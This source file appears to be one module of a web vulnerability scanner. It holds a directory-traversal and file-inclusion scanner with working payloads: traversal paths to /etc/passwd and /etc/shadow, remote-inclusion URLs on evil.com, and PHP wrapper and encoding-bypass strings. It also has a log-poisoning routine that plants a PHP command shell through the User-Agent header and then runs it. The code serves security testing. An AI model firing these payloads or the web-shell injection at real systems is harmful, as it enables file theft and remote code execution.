
import { PayloadGenerator } from '../../payloads/PayloadGenerator.js';

export class DirectoryTraversalScanner {
  constructor(scanner) {
    this.scanner = scanner;
    this.payloadGenerator = new PayloadGenerator();
    this.logger = scanner.logger;
    this.traversalPayloads = this.payloadGenerator.generatePayloads('lfi', {
      applyEncoding: true,
      applyBypasses: true,
      generateMutations: true
    });
  }

  async scan() {
    this.logger.info('🔍 Starting Directory Traversal vulnerability scan');
    
    try {
      await this.scanLocalFileInclusion();
      await this.scanRemoteFileInclusion();
      await this.scanLogPoisoning();
      await this.scanWrapperAbuse();
      await this.scanFilterBypass();
      
      this.logger.info('✅ Directory Traversal scan completed');
    } catch (error) {
      this.logger.error('❌ Error in Directory Traversal scanner:', error);
    }
  }

  async scanLocalFileInclusion() {
    this.logger.debug('Testing for Local File Inclusion vulnerabilities');
    
    const lfiPayloads = [
      '../../../../../../../etc/passwd',
      '../../../../../../../etc/shadow',
      '../../../../../../../etc/hosts',
      '../../../../../../../proc/version',
      '../../../../../../../proc/self/environ',
      '..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '..\\..\\..\\..\\..\\..\\..\\windows\\system.ini',
      '../../../../../../../var/log/apache2/access.log',
      '../../../../../../../var/log/nginx/access.log'
    ];

    await this.testFileInclusionPayloads(lfiPayloads, 'Local File Inclusion');
  }

  async scanRemoteFileInclusion() {
    this.logger.debug('Testing for Remote File Inclusion vulnerabilities');
    
    const rfiPayloads = [
      'http://evil.com/shell.txt',
      'https://evil.com/shell.txt',
      'ftp://evil.com/shell.txt',
      'http://evil.com/shell.txt%00',
      'data://text/plain,<?php phpinfo(); ?>',
      'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
    ];

    await this.testFileInclusionPayloads(rfiPayloads, 'Remote File Inclusion');
  }

  async scanLogPoisoning() {
    this.logger.debug('Testing for Log Poisoning vulnerabilities');
    
    const logFiles = [
      '/var/log/apache2/access.log',
      '/var/log/apache2/error.log',
      '/var/log/nginx/access.log',
      '/var/log/nginx/error.log',
      '/var/log/auth.log',
      '/var/log/mail.log',
      '/var/log/vsftpd.log'
    ];

    for (const logFile of logFiles) {
      await this.testLogPoisoning(logFile);
    }
  }

  async scanWrapperAbuse() {
    this.logger.debug('Testing for PHP Wrapper abuse');
    
    const wrapperPayloads = [
      'php://filter/read=convert.base64-encode/resource=index.php',
      'php://filter/convert.base64-encode/resource=config.php',
      'php://input',
      'zip://shell.zip#shell.php',
      'expect://id',
      'php://filter/read=string.rot13/resource=index.php'
    ];

    await this.testFileInclusionPayloads(wrapperPayloads, 'PHP Wrapper Abuse');
  }

  async scanFilterBypass() {
    this.logger.debug('Testing for filter bypass techniques');
    
    const bypassPayloads = [
      '....//....//....//....//....//....//....//etc/passwd',
      '..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
      '../../../../../../../etc/passwd%00',
      '../../../../../../../etc/passwd%00.txt'
    ];

    await this.testFileInclusionPayloads(bypassPayloads, 'Filter Bypass');
  }

  async testFileInclusionPayloads(payloads, vulnerabilityType) {
    const testUrls = await this.discoverFileParameters();
    
    for (const urlData of testUrls) {
      for (const payload of payloads) {
        try {
          const testUrl = this.buildTestUrl(urlData.url, urlData.parameter, payload);
          const response = await this.scanner.makeRequest(testUrl, {
            timeout: 10000,
            headers: {
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
          });

          if (this.detectFileInclusion(response, payload, vulnerabilityType)) {
            await this.reportFileInclusionVulnerability({
              type: vulnerabilityType,
              url: testUrl,
              payload: payload,
              response: response,
              parameter: urlData.parameter,
              method: 'GET'
            });
          }
        } catch (error) {
          this.logger.debug('File inclusion test failed:', error.message);
        }
      }
    }
  }

  async testLogPoisoning(logFile) {
    try {
      // First, try to include the log file
      const traversalPayload = `../../../../../../../${logFile}`;
      const testUrls = await this.discoverFileParameters();
      
      for (const urlData of testUrls) {
        const testUrl = this.buildTestUrl(urlData.url, urlData.parameter, traversalPayload);
        const response = await this.scanner.makeRequest(testUrl);
        
        if (this.detectLogFile(response)) {
          // Log file accessible, now test for poisoning
          await this.attemptLogPoisoning(logFile, urlData);
        }
      }
    } catch (error) {
      this.logger.debug('Log poisoning test failed:', error.message);
    }
  }

  async attemptLogPoisoning(logFile, urlData) {
    try {
      // Attempt to poison user-agent in access logs
      const poisonPayload = '<?php system($_GET["cmd"]); ?>';
      
      await this.scanner.makeRequest(this.scanner.target, {
        headers: {
          'User-Agent': poisonPayload
        }
      });

      // Try to execute the poisoned log
      const executeUrl = this.buildTestUrl(
        urlData.url, 
        urlData.parameter, 
        `../../../../../../../${logFile}`
      ) + '&cmd=id';
      
      const response = await this.scanner.makeRequest(executeUrl);
      
      if (this.detectCommandExecution(response)) {
        await this.reportFileInclusionVulnerability({
          type: 'Log Poisoning',
          url: executeUrl,
          payload: poisonPayload,
          response: response,
          parameter: urlData.parameter,
          method: 'GET',
          logFile: logFile
        });
      }
    } catch (error) {
      this.logger.debug('Log poisoning attempt failed:', error.message);
    }
  }

  async discoverFileParameters() {
    const parameters = [];
    
    try {
      const response = await this.scanner.makeRequest(this.scanner.target);
      
      // Extract URLs with file-related parameters
      const urlRegex = /(?:href|src|action)=['"]([^'"]*\?[^'"]*)['"]/gi;
      let match;
      
      while ((match = urlRegex.exec(response.data)) !== null) {
        const url = match[1];
        const [baseUrl, queryString] = url.split('?');
        
        if (queryString) {
          const params = queryString.split('&');
          for (const param of params) {
            const [name] = param.split('=');
            if (this.isFileParameter(name)) {
              parameters.push({
                url: this.resolveUrl(baseUrl),
                parameter: name
              });
            }
          }
        }
      }
      
      // Add common file parameter names
      const commonFileParams = [
        'file', 'page', 'include', 'template', 'doc', 'document',
        'view', 'content', 'path', 'dir', 'folder', 'load', 'read'
      ];
      
      if (parameters.length === 0) {
        commonFileParams.forEach(param => {
          parameters.push({
            url: this.scanner.target,
            parameter: param
          });
        });
      }
    } catch (error) {
      this.logger.debug('File parameter discovery failed:', error.message);
      parameters.push({
        url: this.scanner.target,
        parameter: 'file'
      });
    }
    
    return parameters;
  }

  isFileParameter(paramName) {
    const fileParamPatterns = [
      'file', 'page', 'include', 'template', 'doc', 'document',
      'view', 'content', 'path', 'dir', 'folder', 'load', 'read',
      'show', 'display', 'get', 'fetch'
    ];
    
    return fileParamPatterns.some(pattern => 
      paramName.toLowerCase().includes(pattern)
    );
  }

  buildTestUrl(baseUrl, parameter, payload) {
    const url = new URL(baseUrl);
    url.searchParams.set(parameter, payload);
    return url.toString();
  }

  resolveUrl(url) {
    if (url.startsWith('http')) {
      return url;
    } else if (url.startsWith('/')) {
      const target = new URL(this.scanner.target);
      return `${target.protocol}//${target.host}${url}`;
    } else {
      return `${this.scanner.target}/${url}`;
    }
  }

  detectFileInclusion(response, payload, type) {
    if (!response || !response.data) return false;
    
    const responseBody = response.data.toLowerCase();
    
    // Check for file content indicators
    const fileIndicators = {
      'Local File Inclusion': [
        'root:x:0:0:root:/root:/bin/bash',
        'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
        'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
        'sys:x:3:3:sys:/dev:/usr/sbin/nologin',
        '[boot loader]',
        '[operating systems]',
        'linux version',
        'microsoft windows',
        '# /etc/hosts'
      ],
      'Remote File Inclusion': [
        'phpinfo()',
        'php version',
        'system information',
        'configuration file'
      ],
      'PHP Wrapper Abuse': [
        'php version',
        '<?php',
        'pdo_mysql',
        'openssl',
        'zlib'
      ],
      'Filter Bypass': [
        'root:x:0:0:root:/root:/bin/bash',
        'linux version',
        'microsoft windows'
      ]
    };

    const indicators = fileIndicators[type] || fileIndicators['Local File Inclusion'];
    
    return indicators.some(indicator => responseBody.includes(indicator.toLowerCase()));
  }

  detectLogFile(response) {
    if (!response || !response.data) return false;
    
    const responseBody = response.data.toLowerCase();
    
    const logIndicators = [
      'apache',
      'nginx',
      'access.log',
      'error.log',
      'auth.log',
      'get /',
      'post /',
      '200 ',
      '404 ',
      '500 ',
      'mozilla/',
      'user-agent'
    ];
    
    return logIndicators.filter(indicator => 
      responseBody.includes(indicator)
    ).length >= 3; // Multiple indicators suggest log file
  }

  detectCommandExecution(response) {
    if (!response || !response.data) return false;
    
    const responseBody = response.data.toLowerCase();
    
    const cmdIndicators = [
      'uid=',
      'gid=',
      'groups=',
      'www-data',
      'apache',
      'nginx',
      'root'
    ];
    
    return cmdIndicators.some(indicator => responseBody.includes(indicator));
  }

  async reportFileInclusionVulnerability(details) {
    const vulnerability = {
      title: `Directory Traversal / File Inclusion - ${details.type}`,
      severity: this.calculateFileInclusionSeverity(details.type),
      category: 'Directory Traversal',
      type: details.type,
      url: details.url,
      method: details.method,
      parameter: details.parameter,
      payload: details.payload,
      evidence: this.extractFileInclusionEvidence(details.response, details.payload),
      impact: this.getFileInclusionImpact(details.type),
      recommendation: this.getFileInclusionRecommendation(),
      owasp: ['A5 - Security Misconfiguration', 'A6 - Vulnerable and Outdated Components'],
      cwe: 'CWE-22',
      cvss: this.calculateFileInclusionCVSS(details.type),
      poc: this.generateFileInclusionPOC(details),
      steps: this.generateFileInclusionSteps(details),
      logFile: details.logFile
    };

    this.scanner.addVulnerability(vulnerability);
  }

  calculateFileInclusionSeverity(type) {
    const severityMap = {
      'Local File Inclusion': 'High',
      'Remote File Inclusion': 'Critical',
      'Log Poisoning': 'Critical',
      'PHP Wrapper Abuse': 'High',
      'Filter Bypass': 'High'
    };
    
    return severityMap[type] || 'High';
  }

  getFileInclusionImpact(type) {
    const impacts = {
      'Local File Inclusion': 'Disclosure of sensitive files, potential for code execution through log poisoning',
      'Remote File Inclusion': 'Remote code execution, complete server compromise, malware installation',
      'Log Poisoning': 'Remote code execution through log file manipulation',
      'PHP Wrapper Abuse': 'Source code disclosure, potential remote code execution',
      'Filter Bypass': 'Bypass of security controls, access to restricted files'
    };
    
    return impacts[type] || 'Unauthorized file access and potential code execution';
  }

  getFileInclusionRecommendation() {
    return [
      'Validate and sanitize all file path inputs',
      'Use whitelist of allowed files instead of blacklist',
      'Implement proper access controls on file system',
      'Use chroot jails or similar containment mechanisms',
      'Disable dangerous PHP functions if applicable',
      'Regular security testing and code review',
      'Implement Web Application Firewall (WAF)',
      'Use absolute paths and avoid user-controlled path construction'
    ].join('; ');
  }

  calculateFileInclusionCVSS(type) {
    const cvssMap = {
      'Local File Inclusion': '7.5',
      'Remote File Inclusion': '9.8',
      'Log Poisoning': '9.8',
      'PHP Wrapper Abuse': '7.5',
      'Filter Bypass': '7.5'
    };
    
    return cvssMap[type] || '7.5';
  }

  extractFileInclusionEvidence(response, payload) {
    if (!response || !response.data) return 'No response data available';
    
    const responseBody = response.data;
    const lines = responseBody.split('\n');
    const evidenceLines = [];
    
    // Extract first few lines that contain file content indicators
    for (let i = 0; i < Math.min(lines.length, 10); i++) {
      const line = lines[i].trim();
      if (line.length > 0) {
        evidenceLines.push(`Line ${i + 1}: ${line}`);
      }
    }
    
    return evidenceLines.length > 0 ? evidenceLines.join('\n') : 'File inclusion successful';
  }

  generateFileInclusionPOC(details) {
    return {
      description: `Proof of Concept for ${details.type}`,
      steps: [
        `1. Navigate to: ${details.url}`,
        `2. Modify parameter ${details.parameter} with payload: ${details.payload}`,
        `3. Submit request`,
        `4. Observe file contents in response`
      ],
      curl: `curl -X GET "${details.url}"`,
      expectedResult: 'Sensitive file contents should be visible in the response'
    };
  }

  generateFileInclusionSteps(details) {
    return [
      'Identify file parameter in the application',
      'Test with directory traversal payloads',
      'Attempt to access sensitive files',
      'Verify file contents in response',
      'Test for filter bypass techniques',
      'Document the complete attack vector'
    ];
  }
}
